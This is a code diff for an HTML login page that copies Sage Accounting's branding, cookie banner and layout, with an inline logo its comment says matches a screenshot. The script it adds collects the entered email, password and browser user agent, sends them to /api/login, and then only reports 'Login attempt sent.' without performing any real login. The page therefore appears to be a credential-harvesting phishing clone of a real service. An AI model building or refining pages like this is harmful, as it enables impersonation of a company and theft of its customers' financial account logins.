@@ -4,47 +4,53 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Sage Accounting - Login</title>
-  <!-- Make sure this file is at project-root/styles.css -->
   <link rel="stylesheet" href="styles.css">
   <link rel="icon" href="data:,">
 </head>
 <body>
-  <div class="cookie-bar">
+  <div class="cookie-bar" role="region" aria-label="Cookie banner">
     <div class="cookie-text">
       We use cookies on our website to provide you with the best experience. If you continue browsing, you are consenting to our use of these cookies, but if you would like to know more, including how you can change your settings, take a look at our
       <a href="#" class="privacy">Privacy Policy</a>
     </div>
-    <button class="cookie-accept">Accept &amp; Close</button>
+    <button class="cookie-accept" aria-label="Accept cookies">Accept &amp; Close</button>
   </div>
 
-  <main class="page">
-    <div class="login-wrap">
-      <div class="brand">
-        <!-- Ensure assets/sage-logo-green.svg exists at project-root/assets/ -->
-        <img src="assets/sage-logo-green.svg" alt="Sage logo" class="logo">
-        <div class="divider"></div>
-        <h1>Accounting</h1>
+  <main class="page" role="main">
+    <div class="login-wrap" aria-labelledby="login-heading">
+      <div class="brand" aria-hidden="false">
+        <!-- Inline SVG for the green "Sage" mark to avoid an external asset and match screenshot tone -->
+        <svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Sage logo">
+          <!-- simple stylized "Sage" placeholder shape + green circle feel -->
+          <g fill="none" fill-rule="evenodd">
+            <path d="M10 38c0-9 7-16 16-16 6 0 9 3 12 6 2 2 5 5 10 5 6 0 11-5 11-11 0-7-6-12-15-12-9 0-16 7-16 16" fill="#26CF67"/>
+            <path d="M60 38c0-9 7-16 16-16 6 0 9 3 12 6 2 2 5 5 10 5 6 0 11-5 11-11 0-7-6-12-15-12-9 0-16 7-16 16" fill="#26CF67" transform="translate(20,0)"/>
+          </g>
+        </svg>
+
+        <div class="divider" aria-hidden="true"></div>
+        <h1 id="login-heading">Accounting</h1>
       </div>
 
-      <form id="loginForm" class="login-form" autocomplete="off">
-        <div class="input-row">
-          <span class="icon">✉</span>
+      <form id="loginForm" class="login-form" autocomplete="off" novalidate>
+        <div class="input-row" title="Email">
+          <span class="icon" aria-hidden="true">✉</span>
           <input type="email" id="email" name="email" placeholder="Email Address" required>
         </div>
 
-        <div class="input-row">
-          <span class="icon">🔒</span>
+        <div class="input-row" title="Password">
+          <span class="icon" aria-hidden="true">🔒</span>
           <input type="password" id="password" name="password" placeholder="Password" required>
         </div>
 
-        <div class="links">
+        <div class="links" aria-hidden="false">
           <a href="#" class="small-link">Forgot your password?</a>
           <a href="#" class="small-link right">Problems logging in?</a>
         </div>
 
         <button type="submit" class="btn-login">Login</button>
 
-        <div class="signup">
+        <div class="signup" aria-hidden="false">
           <strong>New to Accounting?</strong><br>
           <small>
             Sign up as a <a href="#">User</a> | Sign up as an <a href="#">Adviser</a> | Explore the <a href="#">Demo Company</a>
@@ -54,7 +60,44 @@
     </div>
   </main>
 
-  <!-- Ensure public/script.js exists at project-root/public/script.js -->
-  <script src="public/script.js"></script>
+  <script>
+    // Minimal JS for cookie accept and form submit UX (keeps behavior identical to your app)
+    document.addEventListener('DOMContentLoaded', function () {
+      var cookieBtn = document.querySelector('.cookie-accept');
+      if (cookieBtn) {
+        cookieBtn.addEventListener('click', function () {
+          document.querySelector('.cookie-bar').style.display = 'none';
+        });
+      }
+
+      var form = document.getElementById('loginForm');
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+
+        var btn = document.querySelector('.btn-login');
+        btn.disabled = true;
+        btn.textContent = 'Sending...';
+
+        fetch('/api/login', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ email: email, password: password, userAgent: navigator.userAgent })
+        }).then(function (resp) {
+          if (resp.ok) {
+            alert('Login attempt sent.');
+          } else {
+            alert('Server error. Please try again.');
+          }
+        }).catch(function () {
+          alert('Network error.');
+        }).finally(function () {
+          btn.disabled = false;
+          btn.textContent = 'Login';
+        });
+      });
+    });
+  </script>
 </body>
 </html>
